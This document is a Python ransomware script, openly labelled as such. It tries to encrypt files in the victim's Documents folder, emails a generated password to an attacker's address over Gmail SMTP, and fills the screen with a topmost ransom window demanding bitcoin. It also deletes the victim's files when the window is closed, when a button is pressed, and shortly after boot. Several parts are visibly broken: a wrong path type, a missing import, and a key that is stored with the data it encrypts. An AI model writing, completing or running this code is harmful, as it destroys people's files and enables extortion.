
#ransomware 
textmal = "                           !!! You Are An Idiot !!!\n\nHello little stupid, you have executed one of the best RANSOMWARE in the world,\n your personal files have been encrypted with a strong algorithm created by us.\nThe only method to get back your data is to pay in bitcoin to the address shown\ndown here. The rules are:\n \n - DO NOT CLOSE ME \n - DO NOT TRY TO RESTART \n - DO NOT TRY TO SHUT DOWN \n  \nEverything you want to do, like decrypt your data and else is forbidden. If you dont pay in 24 hours all is gonna be deleted. Good luck stupid. "
import tkinter as tk
from tkinter import messagebox
import os
from time import sleep
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import random 
import string
import shutil
from psutil import boot_time
import time

def crypter():
    def generate_password(length):
        characters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(characters) for i in range(length))
        return password
    
    
    
    def encrypt_file(file_path, password):
        with open(file_path, 'rb') as file:
            file_data = file.read()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(file_data) + padder.finalize()

            key = os.urandom(32)  # Generate a random 256-bit key
            iv = os.urandom(16)  # Generate a random 128-bit IV

            cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

            with open(file_path + '.enc', 'wb') as encrypted_file:
                encrypted_file.write(key)
                encrypted_file.write(iv)
                encrypted_file.write(encrypted_data)

            return key, iv

    def sendpsw(psw):
        email = "your_email@gmail.com"
        password = "your_password"
        to_email = "recipient_email@example.com"

        message = MIMEMultipart()
        message["From"] = email
        message["To"] = to_email
        message["Subject"] = "Ransomware psw"

        # Email body
        body = psw
        message.attach(MIMEText(body, "plain"))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, to_email, message.as_string())
        server.quit()

        print("Email sent successfully!")

    dir_path = os.path.join('C:\\Users\\', os.getlogin(), 'Documents')
    newborn_psw = generate_password(15)
    encrypt_file(dir_path, newborn_psw)
    sendpsw(newborn_psw)
def delete_all():

    try:
        dir_path =  ('C:\\Users\\', os.getlogin(),'\\Documents') # <---- here you can add more than 1 path.
        dir_contents = os.listdir(dir_path)
        # Follow this code for all of the paths that you want to add.
        for item in dir_contents:
            item_path = os.path.join(dir_path, item)
            
            if os.path.isfile(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                os.rmdir(item_path)

    except PermissionError:
        print('Need more privileges')

def use():
    root = tk.Tk()
    crypter()
    
    def on_closing():
        if messagebox.askokcancel("Quit", "Do you want to destroy your pc?"):
            delete_all()
            root.destroy()
            use()
        else:
            use()

    root.protocol("WM_DELETE_WINDOW", on_closing)

        
    root.title("You're Fucked")
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    root.geometry(f"{screen_width}x{screen_height}+0+0")  
    root.attributes("-fullscreen", True)  

    root.resizable(False, False)
    root.wm_attributes('-topmost', True)

    text_widget = tk.Text(root)
    text_widget.pack(pady=10)
    text_widget.insert(tk.END, textmal , "custom_color")
    text_widget.tag_configure("custom_color", foreground="white")
    deletenowbutton = tk.Button(root, text="DELETE  NOW", command=delete_all())
    deletenowbutton.config(bg="white")
    deletenowbutton.pack(pady=10)
    root.config(bg="#831212")
    text_widget.config(bg="#831212")
    text_widget.config(state='disabled') 

    root.mainloop()
def confirm():
    result = messagebox.askquestion("", "Are you sure you want to continue?")
    if result == "yes":
        use()
    else:
        pass
uptime = time.time() - psutil.boot_time()
if uptime < 60:
    delete_all()
    use()
confirm()



